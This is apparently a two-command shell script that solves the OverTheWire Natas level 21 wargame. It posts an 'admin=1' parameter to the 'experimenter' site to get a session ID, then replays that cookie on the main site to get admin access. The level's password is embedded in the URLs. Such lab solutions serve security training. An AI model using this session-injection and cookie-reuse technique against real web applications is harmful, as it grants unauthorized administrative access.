SESSID=`curl 'http://natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ@natas21-experimenter.natas.labs.overthewire.org/index.php' -H 'Host: natas21-experimenter.natas.labs.overthewire.org' --data 'admin=1&submit=1' -v |& grep -o -e "PHPSESSID=[^;]*"`

echo SESSIONID: $SESSID
curl 'http://natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ@natas21.natas.labs.overthewire.org/' -H 'Host: natas21.natas.labs.overthewire.org' -H "Cookie: $SESSID"
